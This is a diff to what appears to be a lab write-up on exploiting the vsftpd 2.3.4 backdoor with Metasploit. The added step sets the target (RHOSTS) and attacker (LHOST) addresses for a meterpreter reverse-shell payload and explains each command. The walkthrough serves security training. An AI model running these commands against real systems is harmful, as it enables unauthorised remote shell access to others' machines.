@@ -61,3 +61,22 @@ show options: Displays all the configurable parameters for the selected exploit 
 - RPORT: The target port parameter, which is set to 21 by default for the FTP service.
 
 - Payload Settings: The default payload (cmd/linux/http/x86/meterpreter_reverse_tcp) handles the connection back to our attack machine once the backdoor is triggered.
+
+### Step 3: Configuring Target and Local Host Parameters
+
+Before launching the attack, I configured the required parameters so the exploit knows where to send the attack and where to receive the incoming connection.
+
+bash
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.0.113
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.0.139
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+<img width="1920" height="950" alt="Screenshot_2026-10-17_12_02_40" src="https://github.com/user-attachments/assets/b6dc6cc8-ac1c-4ecd-b740-6410a6361ded" />
+
+Commands Explained:
+
+- set RHOSTS 192.168.0.113: Defines the Remote Host (target machine IP address) that we want to exploit.
+
+- set LHOST 192.168.0.139: Defines the Local Host (our attacker/Kali Linux machine IP address) so the target knows where to send the reverse shell connection back.
+
+- show options: Verified again to ensure both RHOSTS and LHOST were updated successfully before executing the exploit.
